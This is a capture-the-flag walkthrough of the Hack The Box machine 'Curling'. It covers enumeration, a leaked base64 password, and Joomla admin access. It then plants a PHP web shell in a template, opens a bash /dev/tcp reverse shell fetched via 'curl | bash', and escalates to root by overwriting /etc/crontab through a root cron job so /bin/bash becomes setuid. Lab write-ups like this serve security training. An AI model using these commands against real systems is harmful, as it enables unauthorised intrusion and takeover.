![Curling.PNG](/assets/Machines/Easy/Curling/Curling.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.150
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.150
```

**Output**
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

3. Visit webpage
![web.PNG](/assets/Machines/Easy/Curling/web.PNG)

* We found one user: **Floris**


4. View source code from web page. Press `Ctrl` + `u`

![leak.PNG](/assets/Machines/Easy/Curling/leak.PNG)

* In last part of code we found **leak information** 

5. Visit file found previously

* URL: `http://10.10.10.150/secret.txt`
* Secret: `Q3VybGluZzIwMTgh`


6. Decode this line with base64
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Curling]
└─| echo "Q3VybGluZzIwMTgh" | base64 -d
Curling2018!
```

* Now we have import information like user and posible password `Floris:Curling2018!`

* This credentials not function in ssh.

7. Do **Directory Fuzzing**, you can use **dirbuster** | **wfuzz** or any tool.
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Curling]
└─| wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://10.10.10.150/FUZZ/
```

**Output**
```
00000002:   200        1 L      2 W        31 Ch       "images"     
000000069:   403        9 L      28 W       277 Ch      "icons"   
000000464:   200        1 L      2 W        31 Ch       "bin"   
000000067:   200        1 L      2 W        31 Ch       "templates"    
000000066:   200        1 L      2 W        31 Ch       "media"   
000000612:   200        1 L      2 W        31 Ch       "includes"     
000000499:   200        1 L      2 W        31 Ch       "plugins"   
000000131:   200        1 L      2 W        31 Ch       "modules" 
000000827:   200        1 L      2 W        31 Ch       "language"
000001019:   200        1 L      2 W        31 Ch       "cache"
000000951:   200        1 L      2 W        31 Ch       "components"
000001167:   200        1 L      2 W        31 Ch       "libraries"
000003017:   200        1 L      2 W        31 Ch       "tmp"
000003312:   200        1 L      2 W        31 Ch       "layouts"
000005294:   200        109 L    348 W      5110 Ch     "administrator"
000019068:   200        1 L      2 W        31 Ch       "cli"
000089167:   403        9 L      28 W       277 Ch      "server-status"
```

8. Visit **administrator** and use previous credentials

![login.PNG](/assets/Machines/Easy/Curling/login.PNG)

9. To try execute commands go to `Configuration>Templates>Templates>Protostar>index.html`

* Add this line of code `system($_REQUEST['cmd']);`  in any part of document, after this **Save & Exit**

10. Visit again first web page and try to execute a command

* URL: `http://10.10.10.150/index.php?cmd=whoami`

![out.PNG](/assets/Machines/Easy/Curling/out.PNG)

11. Get a reverse shell

* First, create a **index.html** with next bash code.
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Curling]
└─| cat index.html 
#!/bin/bash

bash -i &> /dev/tcp/10.10.14.14/443 0>&1
```

* Then, create a http server with python in current directory of previous .html file
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Curling]
└─| python -m http.server 80
```

* Next, use this code to read out .html file and execute with bash
* **Code:** `curl <tun0 IP>|bash`

* Remember listen with nc in port choosed


12. Now we obtain a shell
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Curling]
└─# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.10.150] 47262
bash: cannot set terminal process group (1404): Inappropriate ioctl for device
bash: no job control in this shell
www-data@curling:/var/www/html$
```

13. Show all files in **floris directory**
```bash
www-data@curling:/tmp$ ls -la /home/floris/
total 44
drwxr-xr-x 6 floris floris 4096 Aug  2 14:44 .
drwxr-xr-x 3 root   root   4096 Aug  2 14:44 ..
lrwxrwxrwx 1 root   root      9 May 22  2018 .bash_history -> /dev/null
-rw-r--r-- 1 floris floris  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 floris floris 3771 Apr  4  2018 .bashrc
drwx------ 2 floris floris 4096 Aug  2 14:44 .cache
drwx------ 3 floris floris 4096 Aug  2 14:44 .gnupg
drwxrwxr-x 3 floris floris 4096 Aug  2 14:44 .local
-rw-r--r-- 1 floris floris  807 Apr  4  2018 .profile
drwxr-x--- 2 root   floris 4096 Aug  2 14:44 admin-area
-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup
-rw-r----- 1 floris floris   33 Jan 14 14:32 user.txt
```

* File **password_backup** is a compress file.

| Extension | Decompress |
|:---------:|:----------:|
|  **bz2**  | `bzip2 -d <File>` |
|   **gz**  | `unzip <File>`    |
|  **tar**  | `tar -xf <File>`  |


14. After decompress multiple times we obtain a password from user floris
```bash
www-data@curling:/tmp$ cat password.txt 
5d<wdCbdZu)|hChXll
```

15. Login how floris user and cat **user flag**
```bash
floris@curling:~$ cat user.txt 
2b7d828f3c94d3f3052d050d4bec99e0
```

---
---
---
### **Privileges Escalation** 💀
1. Use pspy to discover posible contrabs

* To transfer pspy file, create a http.server with python and in the target machine use **wget** to download and execute.
```bash
2023/01/14 15:49:01 CMD: UID=0    PID=3025   | curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
```

* We watch this, crontab use `-K` parameter and this crontab is running by root (UID=0)

**Example to use -K parameter**
```bash
# --- Example file ---
               # this is a comment
               url = "example.com"
               output = "curlhere.html"
               user-agent = "superagent/1.0"
```

2. In this case we create a malicious crontab

* First, copy our crontab file
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Curling]
└─| cp /etc/crontab .
```

* Then, modify this to change /bin/bash permissions
```bash
1 *    * * *   root    chmod u+s /bin/bash
```

* Next, use python to create a http server

* Finally, modify **input** file in target machine
```bash
url = "http://<Tun0 IP>/crontab"
output = "/etc/crontab"
```

3. Wait some minutes and finally...
```bash
floris@curling:~/admin-area$ ls -l /bin/bash 
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

4. Execute a bash how root and cat **root flag**
```bash
floris@curling:~/admin-area$ bash -p
bash-4.4# whoami
root
```

```bash
bash-4.4# cat /root/root.txt 
a92321c558ef3b3c5345f1690362d749
```